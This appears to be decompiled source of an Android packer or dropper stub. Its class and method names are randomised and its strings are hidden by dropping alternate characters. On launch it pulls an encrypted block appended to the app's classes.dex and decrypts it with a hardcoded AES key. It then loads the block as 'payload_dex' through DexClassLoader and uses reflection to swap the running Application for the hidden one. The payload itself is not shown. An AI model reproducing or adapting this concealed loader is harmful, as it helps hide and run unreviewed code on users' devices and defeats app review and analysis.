package com;

import android.app.Application;
import android.app.Instrumentation;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.os.Build;
import android.util.ArrayMap;
import dalvik.system.DexClassLoader;
import java.io.BufferedInputStream;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.ref.WeakReference;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/* loaded from: classes.dex */
public class XYLbKnJHsb extends Application {
    @Override // android.content.ContextWrapper
    protected void attachBaseContext(Context context) {
        WeakReference weakReference;
        super.attachBaseContext(context);
        try {
            File dir = getDir(hmwwvCWYYmCpKI("YpbaWyClVobaqdR_Qopdsevx"), 0);
            File dir2 = getDir(hmwwvCWYYmCpKI("vpYaoyeluoyaldS_MdMeox"), 0);
            if (dir2.listFiles().length == 0) {
                gDXFebJXInWbsSahbeppJpG(rnCkCHWZROCuuZfQixuUvJQao(), dir2.getAbsolutePath());
            }
            Object TYvaVyYFgPWmKqaceEop = TYvaVyYFgPWmKqaceEop(hmwwvCWYYmCpKI("WaFnldkrMoEiVdQ.ZaCpOpX.MAicvtkiovLigtRyfTZhbrFesaHd"), hmwwvCWYYmCpKI("fcnuKrrrQeanxtYAFcstwijvKivtpynTUhhrUeeaed"), new Class[0], new Object[0]);
            String packageName = getPackageName();
            if (Build.VERSION.SDK_INT < 19) {
                weakReference = (WeakReference) ((HashMap) KLZtgIYkyJgoFqMSevokPSBVjUHLA(hmwwvCWYYmCpKI("WaFnldkrMoEiVdQ.ZaCpOpX.MAicvtkiovLigtRyfTZhbrFesaHd"), TYvaVyYFgPWmKqaceEop, hmwwvCWYYmCpKI("vmTPgahcKkKavgleJs"))).get(packageName);
            } else {
                weakReference = (WeakReference) ((ArrayMap) KLZtgIYkyJgoFqMSevokPSBVjUHLA(hmwwvCWYYmCpKI("WaFnldkrMoEiVdQ.ZaCpOpX.MAicvtkiovLigtRyfTZhbrFesaHd"), TYvaVyYFgPWmKqaceEop, hmwwvCWYYmCpKI("vmTPgahcKkKavgleJs"))).get(packageName);
            }
            StringBuffer stringBuffer = new StringBuffer();
            for (File file : dir2.listFiles()) {
                stringBuffer.append(file.getAbsolutePath());
                stringBuffer.append(File.pathSeparator);
            }
            stringBuffer.delete(stringBuffer.length() - 1, stringBuffer.length());
            AnUNtXHCQEdoeNFwH(hmwwvCWYYmCpKI("YacngdCrmoyirdG.YaspVpX.rLromaVdjePdQAOpuk"), hmwwvCWYYmCpKI("VmcCLljaOsdsrLhoJaUdpeEr"), weakReference.get(), new DexClassLoader(stringBuffer.toString(), dir.getAbsolutePath(), getApplicationInfo().nativeLibraryDir, (ClassLoader) KLZtgIYkyJgoFqMSevokPSBVjUHLA(hmwwvCWYYmCpKI("YacngdCrmoyirdG.YaspVpX.rLromaVdjePdQAOpuk"), weakReference.get(), hmwwvCWYYmCpKI("VmcCLljaOsdsrLhoJaUdpeEr"))));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public byte[] rnCkCHWZROCuuZfQixuUvJQao() throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        System.out.println(getApplicationInfo().sourceDir);
        ZipInputStream zipInputStream = new ZipInputStream(new BufferedInputStream(new FileInputStream(getApplicationInfo().sourceDir)));
        while (true) {
            ZipEntry nextEntry = zipInputStream.getNextEntry();
            if (nextEntry == null) {
                zipInputStream.close();
                zipInputStream.close();
                return byteArrayOutputStream.toByteArray();
            } else if (nextEntry.getName().equals(hmwwvCWYYmCpKI("EctlBapsEsteJsF.rdVerx"))) {
                byte[] bArr = new byte[1024];
                while (true) {
                    int read = zipInputStream.read(bArr);
                    if (read == -1) {
                        break;
                    }
                    byteArrayOutputStream.write(bArr, 0, read);
                }
            }
        }
    }

    public void gDXFebJXInWbsSahbeppJpG(byte[] bArr, String str) throws Exception {
        byte[] bArr2 = new byte[4];
        int length = bArr.length - 4;
        System.arraycopy(bArr, length, bArr2, 0, 4);
        int readInt = new DataInputStream(new ByteArrayInputStream(bArr2)).readInt();
        byte[] bArr3 = new byte[readInt];
        int i = length - readInt;
        System.arraycopy(bArr, i, bArr3, 0, readInt);
        String[] split = new String(bArr3).split(hmwwvCWYYmCpKI("L@"));
        for (int length2 = split.length - 1; length2 >= 0; length2--) {
            String[] split2 = split[length2].split(hmwwvCWYYmCpKI("d#"));
            String str2 = split2[0];
            int parseInt = Integer.parseInt(split2[1]);
            byte[] bArr4 = new byte[parseInt];
            i -= parseInt;
            System.arraycopy(bArr, i, bArr4, 0, parseInt);
            byte[] FzEMcmiOvbvgMOigIkXrXH = FzEMcmiOvbvgMOigIkXrXH(bArr4);
            File file = new File(str, str2);
            if (!file.exists()) {
                file.createNewFile();
            }
            FileOutputStream fileOutputStream = new FileOutputStream(file);
            fileOutputStream.write(FzEMcmiOvbvgMOigIkXrXH);
            fileOutputStream.close();
        }
    }

    public byte[] FzEMcmiOvbvgMOigIkXrXH(byte[] bArr) throws Exception {
        return wgfnQOOmXBWjnflO("5683417324775518", "4746278284263161", hmwwvCWYYmCpKI("wAXELSB/PEqCPBu/tPgKUCMSQ5DPYasdxdZiJnVg"), bArr);
    }

    @Override // android.app.Application
    public void onCreate() {
        Iterator it;
        try {
            Object TYvaVyYFgPWmKqaceEop = TYvaVyYFgPWmKqaceEop(hmwwvCWYYmCpKI("WaFnldkrMoEiVdQ.ZaCpOpX.MAicvtkiovLigtRyfTZhbrFesaHd"), hmwwvCWYYmCpKI("fcnuKrrrQeanxtYAFcstwijvKivtpynTUhhrUeeaed"), new Class[0], new Object[0]);
            Object KLZtgIYkyJgoFqMSevokPSBVjUHLA = KLZtgIYkyJgoFqMSevokPSBVjUHLA(hmwwvCWYYmCpKI("WaFnldkrMoEiVdQ.ZaCpOpX.MAicvtkiovLigtRyfTZhbrFesaHd"), TYvaVyYFgPWmKqaceEop, hmwwvCWYYmCpKI("BmGBDonuvnmdbAGpkpVlzigcsabtRicoRn"));
            Object KLZtgIYkyJgoFqMSevokPSBVjUHLA2 = KLZtgIYkyJgoFqMSevokPSBVjUHLA(hmwwvCWYYmCpKI("haxnodsrMohikdp.paDpnpZ.eAhcmtmiLvViatHyxTyhHryeVafdo$wArpapBBoiwnOdXDlartda"), KLZtgIYkyJgoFqMSevokPSBVjUHLA, hmwwvCWYYmCpKI("jinnrfSo"));
            AnUNtXHCQEdoeNFwH(hmwwvCWYYmCpKI("YacngdCrmoyirdG.YaspVpX.rLromaVdjePdQAOpuk"), hmwwvCWYYmCpKI("fmVAUpIpklHiGcTaWtAiLoDn"), KLZtgIYkyJgoFqMSevokPSBVjUHLA2, null);
            ((ArrayList) KLZtgIYkyJgoFqMSevokPSBVjUHLA(hmwwvCWYYmCpKI("WaFnldkrMoEiVdQ.ZaCpOpX.MAicvtkiovLigtRyfTZhbrFesaHd"), TYvaVyYFgPWmKqaceEop, hmwwvCWYYmCpKI("DmZAylilsANpNphlCiucUaCthibofnbs"))).remove(KLZtgIYkyJgoFqMSevokPSBVjUHLA(hmwwvCWYYmCpKI("WaFnldkrMoEiVdQ.ZaCpOpX.MAicvtkiovLigtRyfTZhbrFesaHd"), TYvaVyYFgPWmKqaceEop, hmwwvCWYYmCpKI("vmPIKnyiktbiGaolYAlpFpolKitchaHtjiYoKn")));
            ((ApplicationInfo) KLZtgIYkyJgoFqMSevokPSBVjUHLA(hmwwvCWYYmCpKI("YacngdCrmoyirdG.YaspVpX.rLromaVdjePdQAOpuk"), KLZtgIYkyJgoFqMSevokPSBVjUHLA2, hmwwvCWYYmCpKI("PmRAYpypUlCibcGahteimoCnhIengfYo"))).className = "android.app.Application";
            ((ApplicationInfo) KLZtgIYkyJgoFqMSevokPSBVjUHLA(hmwwvCWYYmCpKI("haxnodsrMohikdp.paDpnpZ.eAhcmtmiLvViatHyxTyhHryeVafdo$wArpapBBoiwnOdXDlartda"), KLZtgIYkyJgoFqMSevokPSBVjUHLA, hmwwvCWYYmCpKI("mappcpvIknvfVo"))).className = "android.app.Application";
            Application application = (Application) zFXPeCzOHTfKftQVeOmhEpUcrp(hmwwvCWYYmCpKI("YacngdCrmoyirdG.YaspVpX.rLromaVdjePdQAOpuk"), hmwwvCWYYmCpKI("wmoaakYeZAnpLpolCijcXaTtCiHojn"), KLZtgIYkyJgoFqMSevokPSBVjUHLA2, new Class[]{Boolean.TYPE, Instrumentation.class}, new Object[]{false, null});
            AnUNtXHCQEdoeNFwH(hmwwvCWYYmCpKI("WaFnldkrMoEiVdQ.ZaCpOpX.MAicvtkiovLigtRyfTZhbrFesaHd"), hmwwvCWYYmCpKI("vmPIKnyiktbiGaolYAlpFpolKitchaHtjiYoKn"), TYvaVyYFgPWmKqaceEop, application);
            if (Build.VERSION.SDK_INT < 19) {
                it = ((HashMap) KLZtgIYkyJgoFqMSevokPSBVjUHLA(hmwwvCWYYmCpKI("WaFnldkrMoEiVdQ.ZaCpOpX.MAicvtkiovLigtRyfTZhbrFesaHd"), TYvaVyYFgPWmKqaceEop, hmwwvCWYYmCpKI("FmDPQrvoevPiudMefrYMFapp"))).values().iterator();
            } else {
                it = ((ArrayMap) KLZtgIYkyJgoFqMSevokPSBVjUHLA(hmwwvCWYYmCpKI("WaFnldkrMoEiVdQ.ZaCpOpX.MAicvtkiovLigtRyfTZhbrFesaHd"), TYvaVyYFgPWmKqaceEop, hmwwvCWYYmCpKI("FmDPQrvoevPiudMefrYMFapp"))).values().iterator();
            }
            while (it.hasNext()) {
                try {
                    AnUNtXHCQEdoeNFwH(hmwwvCWYYmCpKI("NaKnhdOrVoXiUdl.mcSobnFtTeEntti.ECdoXnGthegnctaPwrsojvgiLdcefr"), hmwwvCWYYmCpKI("fmgCDornvtueYxPt"), KLZtgIYkyJgoFqMSevokPSBVjUHLA(hmwwvCWYYmCpKI("sacnLdmrMovibdO.yafpApb.RAAcZtmigvCibtuyLTNhvrjeOandy$sPLrvogvUiBddebryCrlgimeCnqtfRaeXcjoKryd"), it.next(), hmwwvCWYYmCpKI("mmiLRoWcAaxlKPsrRowvZihdNeAr")), application);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            application.onCreate();
        } catch (Exception e2) {
            e2.printStackTrace();
            AGyNn123("QNcpnazVcfknWEdKxGoY456");
            GKOxLlIpop123("QNcpnazVcfknWEdKxGoY456");
            super.onCreate();
        }
    }

    public void AGyNn123(String str) {
    }

    public void GKOxLlIpop123(String str) {
    }

    public static byte[] wgfnQOOmXBWjnflO(String str, String str2, String str3, byte[] bArr) throws Exception {
        new IvParameterSpec(str2.getBytes());
        SecretKeySpec secretKeySpec = new SecretKeySpec(str.getBytes(), hmwwvCWYYmCpKI("QALEhS"));
        Cipher instance = Cipher.getInstance(str3);
        instance.init(2, secretKeySpec);
        return instance.doFinal(bArr);
    }

    public static Object TYvaVyYFgPWmKqaceEop(String str, String str2, Class[] clsArr, Object[] objArr) {
        try {
            return Class.forName(str).getMethod(str2, clsArr).invoke(null, objArr);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public static Object zFXPeCzOHTfKftQVeOmhEpUcrp(String str, String str2, Object obj, Class[] clsArr, Object[] objArr) {
        try {
            return Class.forName(str).getMethod(str2, clsArr).invoke(obj, objArr);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public static Object KLZtgIYkyJgoFqMSevokPSBVjUHLA(String str, Object obj, String str2) {
        try {
            Field declaredField = Class.forName(str).getDeclaredField(str2);
            declaredField.setAccessible(true);
            return declaredField.get(obj);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public static void AnUNtXHCQEdoeNFwH(String str, String str2, Object obj, Object obj2) {
        try {
            Field declaredField = Class.forName(str).getDeclaredField(str2);
            declaredField.setAccessible(true);
            declaredField.set(obj, obj2);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static String hmwwvCWYYmCpKI(String str) {
        String str2 = "";
        for (int i = 0; i < str.length(); i++) {
            if (i % 2 == 1) {
                str2 = str2 + str.charAt(i);
            }
        }
        return str2;
    }
}
